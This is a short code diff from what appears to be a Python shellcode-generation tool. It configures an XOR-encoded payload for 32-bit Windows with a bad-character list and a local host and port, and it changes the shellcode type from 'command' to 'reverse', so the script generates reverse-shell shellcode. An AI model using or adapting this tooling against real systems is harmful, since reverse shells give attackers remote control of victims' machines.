@@ -291,14 +291,14 @@ if __name__ == "__main__":
     # Example for generate shellcode for Linux/Windows
     print "[] Generate shellcode started"
 
-    BADCHARS = ["\x00", "\x0a", "\x0d", "\x2f", "\x5c"]
+    BADCHARS = ["\x00", "\x0a", "\x0d", "\x3b"]
 
     os_target = Constants.OS.WINDOWS
     os_target_arch = Constants.OS_ARCH.X32
     #s = OSShellcodes('172.16.195.128', 5555, BADCHARS)
     s = OSShellcodes(os_target, os_target_arch, '127.0.0.1', 4000, BADCHARS)
 
-    shellcode_type = 'command'
+    shellcode_type = 'reverse'
     shellcode = s.create_shellcode(
         shellcode_type,
         encode=Constants.EncoderType.XOR,
@@ -306,4 +306,3 @@ if __name__ == "__main__":
         debug=1
     )
     print "[] Generate shellcode finished"
-    
